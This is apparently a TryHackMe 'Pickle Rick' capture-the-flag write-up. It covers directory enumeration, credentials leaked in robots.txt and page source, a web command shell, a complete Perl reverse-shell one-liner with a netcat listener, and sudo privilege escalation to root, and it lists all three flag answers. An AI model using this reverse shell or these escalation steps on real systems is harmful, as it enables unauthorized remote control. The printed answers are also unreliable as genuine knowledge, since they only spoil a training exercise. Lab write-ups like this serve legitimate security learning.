# CTF Write-Up: Pickle Rick

## Challenge Overview

* Platform: TryHackMe
* Challenge: Pickle Rick
* Category: Web Exploitation & Privilege Escalation
* Objective: Exploit the web application and retrieve three ingredients required for Rick’s potion

---

## Reconnaissance

The target machine was deployed and initial enumeration was performed.

### Directory Enumeration

Using `gobuster`, hidden directories were discovered:

```bash
gobuster dir -u http://<target-ip> -w <wordlist>
```

Discovered endpoints:

* `/robots.txt`
* `/login.php`
* `/portal.php`
* `/assets/`

### robots.txt

Accessing `/robots.txt` revealed a string that appeared to be a password or credential.

### Page Source

Inspecting the HTML source of the webpage revealed a username.

---

## Initial Access

Using the discovered username (from source code) and password (from `robots.txt`), login was attempted at:

```bash
/login.php
```

This successfully authenticated and provided access to a **web-based command shell**.

---

## Question 1: First Ingredient

After gaining access to the command shell:

```bash
ls
```

Two files were identified, including:

```bash
Sup3rS3cretPickl3Ingred.txt
```

Reading the file:

```bash
cat Sup3rS3cretPickl3Ingred.txt
```

### Answer

mr. meeseek hair

---

## Question 2: Second Ingredient

Another file named `clue.txt` contained the message:

> "Look around the file system for the other ingredient."

### Reverse Shell

Attempts with Python and Bash reverse shells failed. A Perl reverse shell was used successfully:

```bash
perl -e 'use Socket;$i="<attacker-ip>";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

A listener was started on the attacker machine:

```bash
nc -lvnp 1234
```

### Privilege Escalation

Checking sudo permissions:

```bash
sudo -l
```

It was found that root privileges were available. Access was escalated using:

```bash
sudo bash -i
```

### Finding the Ingredient

Navigating to Rick’s home directory:

```bash
cd /home/rick
ls
cat "second ingredients"
```

### Answer

1 jerry tear

---

## Question 3: Final Ingredient

After gaining root access, the root directory was explored:

```bash
cd /
ls
```

A file named `3rd.txt` was found.

Reading the file:

```bash
cat /3rd.txt
```

### Answer

fleeb juice

---

## Key Takeaways

* Directory enumeration is crucial for discovering hidden endpoints
* Sensitive information can often be found in `robots.txt` and page source
* Web-based shells can provide initial footholds
* Reverse shells improve control over the target system
* Misconfigured sudo permissions can lead to instant privilege escalation

---

## Tools Used

* Gobuster
* Netcat
* Perl (reverse shell)
* Linux commands
